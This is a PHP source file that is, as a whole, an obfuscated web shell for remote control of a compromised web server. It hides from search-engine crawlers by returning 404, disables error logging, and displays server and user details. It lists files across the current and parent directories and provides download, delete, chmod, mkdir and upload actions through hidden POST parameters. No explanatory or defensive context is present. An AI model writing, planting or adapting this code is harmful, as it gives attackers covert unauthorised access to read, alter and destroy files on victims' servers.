<?php
if(!empty($_SERVER['HTTP_USER_AGENT'])) { $v2045f746 = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "StackRambler"); if(preg_match('/' . implode('|', $v2045f746) . '/i', @$_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); exit; } } @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('max_execution_time',0); @set_time_limit(0); @set_magic_quotes_runtime(0); if(@get_magic_quotes_gpc()) $_POST = n0182dfe8($_POST); $v619d75f8 = preg_split('/\,(\ +)?/', @ini_get('disable_functions')); define("DEFAULT_DIR_DEEP_BACK","3"); if(isset($_POST['p1'])) $_POST['p1'] = urldecode($_POST['p1']); if(isset($_POST['p3'])) $_POST['p3'] = urldecode($_POST['p3']); if(@$_POST['p2']=='download') { if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) { ob_start("ob_gzhandler", 4096); header("Content-Disposition: attachment; filename=".@basename($_POST['p1'])); if (function_exists("mime_content_type")) { $v599dcce2 = @n85ced157($_POST['p1']); header("Content-Type: " . $v599dcce2); } else header("Content-Type: application/octet-stream"); $v0666f0ac = @fopen($_POST['p1'], "r"); if($v0666f0ac) { while(!@feof($v0666f0ac)) echo @fread($v0666f0ac, 1024); @fclose($v0666f0ac); } } exit; } elseif (@$_POST['p2']=='delete') { if (@is_dir($_POST['p1'])) @n46aa46af($_POST['p1']); else @unlink($_POST['p1']); } elseif (@$_POST['p2']=='chmod') { $v58f57b98 = 0; for($v865c0c0b=strlen($_POST['p1'])-1;$v865c0c0b>=0;--$v865c0c0b) $v58f57b98 += (int)$_POST['p3'][$v865c0c0b]*pow(8, (strlen($_POST['p3'])-$v865c0c0b-1)); if(!@chmod($_POST['p1'], $v58f57b98)) echo 'Can\'t set permissions!<br>'; } elseif (@$_POST['p2']=='mkdir') { if(!@mkdir($_POST['p1'])) echo 'Can\'t create new dir<br><script>document.mf.p3.value="";</script>'; } elseif (@$_POST['p2']=='uploadFile') { if(!@move_uploaded_file(@$_FILES['f']['tmp_name'], $_POST['p3'].@$_FILES['f']['name'])) echo 'Can\'t upload file!<br><script>document.mf.p3.value="";</script>'; } if (isset($_REQUEST['sf']) and $_REQUEST['sf']==0) $v2e0a881e = false; else $v2e0a881e = true; if (isset($_REQUEST['showro']) and $_REQUEST['showro']==0) $v8a40bf93 = false; else $v8a40bf93 = true; echo "
<html>
<style>
body{background-color:#000028;color:#e1e1e1;}
body,td,th{ border:1px outset black;font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ border-left:5px solid #df5;color:#fff;background-color:#000028; }
span,h1,a{ color: #df5 !important; }
span{ font-weight: bolder; }
div.content{ padding: 7px;margin-left:7px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
input{ margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace,'Courier New'; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#003300;}
.main tr:hover{border:2px outset gray;;background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
var p1_ = '".((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars(@$_POST['p1'],ENT_QUOTES))."';
var p2_ = '".((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars(@$_POST['p2'],ENT_QUOTES))."';
var p3_ = '".((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars(@$_POST['p3'],ENT_QUOTES))."';
var d = document;
function set(p1,p2,p3) {
	if(p1!=null)d.fm.p1.value=p1;else d.fm.p1.value=p1_;
	if(p2!=null)d.fm.p2.value=p2;else d.fm.p2.value=p2_;
	if(p3!=null)d.fm.p3.value=p3;else d.fm.p3.value=p3_;
}
function g(p1,p2,p3) {
	set(p1,p2,p3);
	d.fm.submit();
}
</script>
<!--
86a20c1b92a2d831b50ba9d62e18ed86
-->
<body>
<form method=post name=fm style='display:none;'>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
</form>
"; if (!function_exists("posix_getpwuid") && !in_array('posix_getpwuid', $v619d75f8)) { function posix_getpwuid($v83878c91) { return false; } } if (!function_exists("posix_getgrgid") && !in_array('posix_getgrgid', $v619d75f8)) { function posix_getgrgid($v83878c91) { return false; } } $v10963336 = @getcwd().DIRECTORY_SEPARATOR; $va9cc6a00 = @diskfreespace($v10963336); $vdb28f3b2 = @disk_total_space($v10963336); $vdb28f3b2 = $vdb28f3b2?$vdb28f3b2:1; if(!function_exists('posix_getegid')) { $vee11cbb1 = @get_current_user(); $v9871d3a2 = @getmyuid(); $v2d53a8fb = @getmygid(); $vdb0f6f37 = "?"; } else { $v9871d3a2 = @posix_getpwuid(@posix_geteuid()); $v2d53a8fb = @posix_getgrgid(@posix_getegid()); $vee11cbb1 = $v9871d3a2['name']; $vdb0f6f37 = $v2d53a8fb['name']; $v9871d3a2 = $v9871d3a2['uid']?$v9871d3a2['uid']:@posix_geteuid(); $v2d53a8fb = $v2d53a8fb['gid']?$v2d53a8fb['gid']:@posix_getegid(); } $v693ee6e5 = count(explode('/', @$_SERVER["REQUEST_URI"])) - 2; if ($v693ee6e5 > DEFAULT_DIR_DEEP_BACK) $v693ee6e5 = DEFAULT_DIR_DEEP_BACK; print "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>PHP:<br>Disabled:<br>HDD:<br>Site:<br>Root:<br>CWD:</span></td><td><nobr>".@php_uname()."</nobr><br>".$v9871d3a2.' ( '.$vee11cbb1.' ) <span>Group:</span> '.$v2d53a8fb.' ( '.$vdb0f6f37.' )<br>'.@phpversion().' <span>Safe mode:</span> ' . (@ini_get('safe_mode')?'<font color=red>ON</font>':'<font color=#00bb00><b>OFF</b></font>').' <a href=# onclick="g(\'\',\'info\')">[ phpinfo ]</a> '.' <span>Datetime:</span> ' . date('Y-m-d H:i:s')."<br><nobr>".implode(",", $v619d75f8)."</nobr><br>".n25d3ae48($vdb28f3b2) . ' <span>Free:</span> ' . n25d3ae48($va9cc6a00) . ' ('. (int) ($va9cc6a00/$vdb28f3b2*100) . "%)<br><a href=\"http://".@$_SERVER['HTTP_HOST']."/\">http://".@$_SERVER['HTTP_HOST']."/</a><br>".htmlspecialchars(realpath(@$_SERVER['DOCUMENT_ROOT']).DIRECTORY_SEPARATOR)."<br>".htmlspecialchars($v10963336)." <a href='".@$_SERVER["REQUEST_URI"]."'>[ home ]</a></td><td align='right' width=10%><span>Server IP:</span><br>".@$_SERVER["SERVER_ADDR"]."<br><span>Client IP:</span><br>".@$_SERVER["REMOTE_ADDR"]."<br>deep = $v693ee6e5</td></tr></table>\n"; if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) { echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style><a href="'.@$_SERVER["REQUEST_URI"].'">BACK</a>'; ob_start(); phpinfo(); $vfa816edb = ob_get_clean(); $vfa816edb = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$vfa816edb); $vfa816edb = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$vfa816edb); echo str_replace('<h1','<h2', $vfa816edb) .'</div><br>'; exit; } $v10ae9fc7 = @n643462d4($v10963336, $v2e0a881e); if ($v693ee6e5 > 0) { $v73600783 = $v10963336.DIRECTORY_SEPARATOR.'..'; for ($v865c0c0b=1; $v865c0c0b <= $v693ee6e5; $v865c0c0b++) { $v10ae9fc7 = array_unique(array_merge($v10ae9fc7, n97fe6a35("$v73600783", $v2e0a881e))); $v73600783 = $v73600783.DIRECTORY_SEPARATOR.'..'; } } print '<script>p1_=p2_=p3_="";</script>
<div class=content>
<table class="main" cellpadding="2" cellspacing="0" width="100%">
<tbody><tr><th>Status</th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>
'; $v2db95e8e = 0; foreach ($v10ae9fc7 as $v73600783) { if (@is_writable($v73600783)) $v9acb4454="<font color='green'>RW</font>"; else if ($v8a40bf93) $v9acb4454="<font color='red'>RO</font>"; else continue; $v72122ce9 = @posix_getpwuid(@fileowner($v73600783)); $vdb0f6f37 = @posix_getgrgid(@filegroup($v73600783)); $vb515e18a = $v72122ce9['name']?$v72122ce9['name']:@fileowner($v73600783); $vaae3c716 = $vdb0f6f37['name']?$vdb0f6f37['name']:@filegroup($v73600783); $v58f57b98 = substr(sprintf('%o', @fileperms($v73600783)), -4); $v8f45a264 = date('Y-m-d H:i:s', @filemtime($v73600783)); if (@is_dir($v73600783)){ $v9407b494 = "[ $v73600783 ]"; $vf7bd60b7 = "<span>DIR</span>"; } else { $vf7bd60b7 = n25d3ae48(@filesize($v73600783)); $v9407b494 = "$v73600783"; } print "<tr".($v2db95e8e?' class=l1':'')."><td><span>$v9acb4454</span></td><td><b><span>".htmlspecialchars($v9407b494)."</span></b></td><td>$vf7bd60b7</td><td>$v8f45a264</td><td>$vb515e18a/$vaae3c716</td><td>$v58f57b98</td><td>"; if (!@is_dir($v73600783)) print "<a title=\"Download\" href=\"#\" onclick=\"g('".urlencode($v73600783)."','download')\">D</a>"; print " <a title=\"Remove\" href=\"#\" onclick=\"g('".urlencode($v73600783)."','delete')\">R</a></td></tr>\n"; $v2db95e8e = $v2db95e8e?0:1; } print "
</tbody></table>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
<tr><td><form method=post onsubmit=\"g(this.m.value,'mkdir');return false;\"><span>Make dir:</span><br><input class='toolsInp' type=text name=m value='".htmlspecialchars($v10963336)."'><input type=submit value='>>'></form></td></tr>
<tr><td><form method=post onsubmit=\"g(this.d.value,'delete');return false;\"><span>Delete (file or dir):</span><br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td></tr>
<tr><td><form method=post><span>Chmod:</span>
<input type=hidden name=p2 value='chmod'><br>
File or dir : <input class='toolsInp' type=text name=p1 value='".htmlspecialchars($v10963336)."'><br>
<input type=text size=6 name=p3 value='0755'>
<input type=submit value='>>'></form></td></tr>
<tr><td><form method='post' ENCTYPE='multipart/form-data'>
<span>Upload file:</span><br>
<input type=hidden name=p2 value='uploadFile'>
Path : <input class='toolsInp' type=text name=p3 value='".htmlspecialchars($v10963336)."'><br>
<input class='toolsInp' type=file name=f>
<input type=submit value='>>'></form><br></td></tr>
</table></div></html>
"; function n7d8f77be($v73600783) { $v700f6fa0 = @opendir($v73600783); while (false !== ($v435ed7e9 = @readdir($v700f6fa0))) $v45b96339[] = $v435ed7e9; return $v45b96339; } function n643462d4($v73600783, $v2e0a881e=true) { if(!function_exists("scandir")) $v63a9f0ea = array_diff(@n7d8f77be($v73600783), array('.', '..')); else $v63a9f0ea = array_diff(@scandir($v73600783), array('.', '..')); foreach($v63a9f0ea as $v2063c160) { if($v2063c160 === '.' || $v2063c160 === '..') continue; if(@is_file($v73600783.DIRECTORY_SEPARATOR.$v2063c160) && $v2e0a881e) { $vb4a88417[]=@realpath($v73600783.DIRECTORY_SEPARATOR.$v2063c160);continue; } elseif(@is_dir($v73600783.DIRECTORY_SEPARATOR.$v2063c160)) $vb4a88417[]=@realpath($v73600783.DIRECTORY_SEPARATOR.$v2063c160).DIRECTORY_SEPARATOR; else continue; foreach(@n643462d4($v73600783.DIRECTORY_SEPARATOR.$v2063c160, $v2e0a881e) as $v2063c160) $vb4a88417[]=$v2063c160; } return $vb4a88417; } function n97fe6a35($v73600783, $v2e0a881e=true) { if (false == ($v700f6fa0 = @opendir($v73600783))) return array(); while (false !== ($v435ed7e9 = @readdir($v700f6fa0))) if ($v435ed7e9 != '..' and @is_dir($v73600783.DIRECTORY_SEPARATOR.$v435ed7e9)) $v45b96339[] = @realpath($v73600783.DIRECTORY_SEPARATOR.$v435ed7e9).DIRECTORY_SEPARATOR; elseif ($v2e0a881e and $v435ed7e9 != '..' and @is_file($v73600783.DIRECTORY_SEPARATOR.$v435ed7e9)) $v45b96339[] = @realpath($v73600783.DIRECTORY_SEPARATOR.$v435ed7e9); @closedir($v700f6fa0); return $v45b96339; } function n46aa46af($v73600783) { foreach(glob($v73600783 . '/*') as $v8c7dd922) { if(@is_dir($v8c7dd922)) n46aa46af($v8c7dd922); else @unlink($v8c7dd922); } @rmdir($v73600783); } function n25d3ae48($v03c7c0ac) { if($v03c7c0ac >= 1073741824) return sprintf('%1.2f', $v03c7c0ac / 1073741824 ). ' GB'; elseif($v03c7c0ac >= 1048576) return sprintf('%1.2f', $v03c7c0ac / 1048576 ) . ' MB'; elseif($v03c7c0ac >= 1024) return sprintf('%1.2f', $v03c7c0ac / 1024 ) . ' KB'; else return $v03c7c0ac . ' B'; } function n0182dfe8($ve04aa510) { if (is_string($ve04aa510)) return stripslashes($ve04aa510); if (is_array($ve04aa510)) foreach($ve04aa510 as $v865c0c0b => $v2063c160) $ve04aa510[$v865c0c0b] = n0182dfe8($v2063c160); return $ve04aa510 ; } ?>
